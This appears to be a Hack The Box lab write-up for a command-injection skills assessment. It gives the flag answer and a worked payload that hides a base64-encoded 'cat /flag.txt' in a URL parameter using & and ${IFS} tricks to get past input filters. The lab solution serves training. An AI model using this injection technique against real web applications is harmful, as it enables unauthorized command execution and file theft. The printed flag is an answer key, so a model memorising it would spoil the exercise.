# Skills Assessment
## Questions
1. What is the content of '/flag.txt'? **Answer: HTB{c0mm4nd3r_1nj3c70r}**
   - Use advanced base64 technique with `&` injection operator and `${IFS}` substitition for spaces to achieve command injection and read the error message for the flag:
        ```shellsession
        $ echo 'cat /flag.txt' | base64
        Y2F0IC9mbGFnLnR4dAo=
        ```
        ```
        GET /index.php?to=tmp%26bash<<<$(base64${IFS}-d<<<Y2F0IC9mbGFnLnR4dAo=)%09&from=696212415.txt&finish=1&move=1 HTTP/1.1e
        ```
        ```html
        <p class="message alert">Error while moving: HTB{c0mm4nd3r_1nj3c70r}</p>
        ```